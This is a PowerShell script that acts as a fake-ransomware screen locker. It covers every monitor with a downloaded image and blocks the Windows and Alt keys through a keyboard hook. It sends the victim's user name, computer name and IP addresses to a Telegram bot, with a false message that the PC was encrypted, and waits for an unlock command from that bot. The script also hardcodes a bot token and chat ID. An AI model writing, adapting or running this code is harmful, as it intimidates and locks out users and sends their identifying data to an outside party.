# ▶️ Setări
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID = "656189986"
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$unlockCommand = "/unlock$user"

# ▶️ Trimite mesaj pe Telegram
function Send-Telegram-Message {
    try {
        $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
            Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
    } catch { $ipLocal = "n/a" }

    try { $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string] } catch { $ipPublic = "n/a" }

    $message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic`n`nUnlock it: $unlockCommand"
    $body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
    $uri = "https://api.telegram.org/bot$botToken/sendMessage"

    try {
        Invoke-RestMethod -Uri $uri -Method POST -Body $body -ContentType 'application/json'
    } catch {}
}

# ▶️ Monitorizează Telegram pentru /unlock
function Start-Telegram-Listener {
    $uriGet = "https://api.telegram.org/bot$botToken/getUpdates"
    $lastUpdateId = 0

    while ($true) {
        try {
            $response = Invoke-RestMethod -Uri $uriGet -TimeoutSec 5
            foreach ($update in $response.result) {
                if ($update.update_id -gt $lastUpdateId) {
                    $lastUpdateId = $update.update_id
                    $txt = $update.message.text
                    if ($txt -eq $unlockCommand) {
                        [System.Windows.Forms.Application]::Exit()
                    }
                }
            }
        } catch {}
        Start-Sleep -Seconds 3
    }
}

# ▶️ Descărcare imagine
function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        Write-Host "Eroare la descărcarea imaginii." -ForegroundColor Red
        exit
    }
}

# ▶️ Blocare taste
function Block-And-MonitorKeys {
    Add-Type @"
        using System;
        using System.Runtime.InteropServices;

        public class KeyboardMonitor {
            private static IntPtr hookId = IntPtr.Zero;

            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
            private static LowLevelKeyboardProc proc = HookCallback;

            private const int WH_KEYBOARD_LL = 13;
            private const int WM_KEYDOWN = 0x0100;

            [DllImport("user32.dll")]
            private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
            [DllImport("user32.dll")]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);
            [DllImport("user32.dll")]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
            [DllImport("kernel32.dll")]
            private static extern IntPtr GetModuleHandle(string lpModuleName);

            public static void BlockAndMonitor() {
                hookId = SetHook(proc);
            }

            private static IntPtr SetHook(LowLevelKeyboardProc proc) {
                using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
                using (var curModule = curProcess.MainModule) {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }

            private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                    int vkCode = Marshal.ReadInt32(lParam);

                    // C = închidere
                    if (vkCode == 0x43) {
                        Environment.Exit(0);
                    }

                    // Windows Left / Right
                    if (vkCode == 0x5B || vkCode == 0x5C) return (IntPtr)1;

                    // Alt
                    if (vkCode == 0x12) return (IntPtr)1;
                }
                return CallNextHookEx(hookId, nCode, wParam, lParam);
            }
        }
"@
    [KeyboardMonitor]::BlockAndMonitor()
}

# ▶️ Afișează imaginea pe toate monitoarele + blocări focus
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $screens = [System.Windows.Forms.Screen]::AllScreens
    $forms = @()

    foreach ($screen in $screens) {
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.StartPosition = 'Manual'
        $form.Location = $screen.Bounds.Location
        $form.Size = $screen.Bounds.Size
        $form.BackColor = 'Black'
        $form.KeyPreview = $true
        $form.Cursor = [System.Windows.Forms.Cursors]::None

        # 🛡 Blocare ALT & menținere focus
        $form.Add_Deactivate({ $form.Focus() })
        $form.Add_KeyDown({ if ($_.Alt) { $_.Handled = $true } })

        try {
            $img = [System.Drawing.Image]::FromFile($tempImagePath)
        } catch {
            exit
        }

        $pb = New-Object Windows.Forms.PictureBox
        $pb.Image = $img
        $pb.Dock = 'Fill'
        $pb.SizeMode = 'StretchImage'
        $form.Controls.Add($pb)

        $forms += $form
    }

    foreach ($f in $forms) { $f.Show() }

    Start-Job { Start-Telegram-Listener }
    [System.Windows.Forms.Application]::Run()
}

# ▶️ Rulare
Download-Image
Send-Telegram-Message
Block-And-MonitorKeys
Show-FullScreenImage
